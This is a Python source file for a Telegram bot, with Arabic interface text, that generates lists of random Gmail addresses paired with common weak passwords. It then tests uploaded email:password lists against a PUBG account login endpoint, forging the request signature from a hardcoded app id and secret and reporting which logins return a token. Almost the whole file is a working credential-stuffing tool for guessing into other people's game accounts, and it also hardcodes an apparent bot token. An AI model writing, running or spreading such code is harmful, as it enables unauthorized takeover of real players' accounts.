"""
Dev :- @DF_GD_D 
Ch :- @T62RS 
In :- 2024/6/7
"""
import telebot as _tb_
from telebot import types as _tp_
import requests as _rq_, hashlib as _hl_, random as _rnd_, string as _str_, time as _tm_
_tkn_ = "7397205638:AAHCGUhusIjout6ryLTE3dLXlZTN9W57Ycg"  # توكنك هنا <--
_bt_ = _tb_.TeleBot(_tkn_)
@_bt_.message_handler(commands=["start"])
def _strt_(_msg_):
    _prvln_ = _tp_.InlineKeyboardMarkup()
    _btn1_ = _tp_.InlineKeyboardButton("🪐 | صنع لستة", callback_data="create_list")
    _btn2_ = _tp_.InlineKeyboardButton("✨ | فحص لستة", callback_data="chk_list")
    _prvln_.add(_btn1_, _btn2_)
    _bt_.send_photo(_msg_.chat.id, "https://t.me/ifuwufuj/41", caption="""
👋 | مرحبا بك عزيزي في بوت Pubg
🚀 | يمكنك من خلال البوت تخمين حسابات الببجي من خلال صنع لست وفحصها
🗽 | اختر من الازرار ادناة :-
••━━━━━━━━━━━━••
@T62RS ~ @DF_GD_D 
""", reply_markup=_prvln_)
@_bt_.callback_query_handler(func=lambda _cl_: True)
def _lnln_(_cl_):
    if _cl_.data == "create_list":
        _crt_lst_(_cl_.message)
    elif _cl_.data == "chk_list":
        _msg_ = _bt_.send_message(_cl_.message.chat.id, """
📁 | الرجاء ارسال الملف ويكون بصيغة الملفات النصية (txt) :-
••━━━━━━━━━━━━••
@T62RS ~ @DF_GD_D 
""")
        _bt_.register_next_step_handler(_msg_, _chk_lst_)
def _crt_lst_(_msg_):
    with open("privatecom.txt", "w") as _file_:
        for _ in range(50):  # تقدر تغير عدد الحسابات في الملف
            _email_ = "".join(_rnd_.choices(_str_.ascii_lowercase + _str_.digits, k=10)) + "@gmail.com"
            _password_ = _rnd_.choice(["1122334455", "1111122222", "1234512345", "1234554321", "as120120", "qwert12345", "monkey", "1z2x3c4v", "q1w2e3r4t5"])  # تقدر تضيف باسووردات اكثر
            _file_.write(f"{_email_}:{_password_}\n")
    _bt_.send_document(_msg_.chat.id, open("privatecom.txt", "rb"))
def _chk_lst_(_msg_):
    try:
        if _msg_.document and _msg_.document.mime_type == "text/plain":
            _file_info_ = _bt_.get_file(_msg_.document.file_id)
            _up_file_ = _bt_.download_file(_file_info_.file_path)
            with open("uploaded.txt", "wb") as _new_file_:
                _new_file_.write(_up_file_)
            _bt_.send_photo(_msg_.chat.id, "https://t.me/ifuwufuj/14", caption="""
🗽 | جار فحص الملف....... 
""")
            _chk_('uploaded.txt', _msg_)
        else:
            _bt_.send_message(_msg_.chat.id, """
⛔ | الرجاء ارسال ملف بصيغه txt
••━━━━━━━━━━━━••
@T62RS ~ @DF_GD_D 
""")
    except Exception as _err_:
        _bt_.send_message(_msg_.chat.id, f"""
📵 | حدث خطأ :- {_err_} 
••━━━━━━━━━━━━••
@T62RS ~ @DF_GD_D 
""")
def _chk_(_filename_, _msg_):
    _results_ = []
    with open(_filename_, "r") as _file_:
        _lines_ = _file_.readlines()
        for _line_ in _lines_:
            _email_, _pess_ = _line_.strip().split(":")
            _pes_ = _hl_.md5(_pess_.encode("utf-8")).hexdigest()
            _J_ = _hl_.md5(f"/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{{{{\"account\":\"{_email_}\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\"{_pess_}\"}}}}3ec8cd69d71b7922e2a17445840866b26d86e283".encode("utf-8")).hexdigest()
            _url_ = f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig={_J_}"
            _headers_ = {
                "Content-Type": "application/json; charset=utf-8",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817)",
                "Host": "igame.msdkpass.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            _data_ = {
                "account": _email_,
                "account_type": 1,
                "area_code": "",
                "extra_json": "",
                "password": _pess_
            }
            _response_ = _rq_.get(_url_, data=_data_, headers=_headers_).text
            if "\"token\"" in _response_:
                _results_.append(f"✅ | Good: {_email_} : {_pess_}")
            else:
                _results_.append(f"⛔ | Bad: {_email_} : {_pess_}")
    with open("Done.txt", "w") as _result_file_:
        _result_file_.write("\n".join(_results_))
    _bt_.send_document(_msg_.chat.id, open("Done.txt", "rb"))
print("\033[1;32m Running.... /start ")
_bt_.polling(none_stop=True)
"""
Dev :- @DF_GD_D 
Ch :- @T62RS 
In :- 2024/6/7
"""
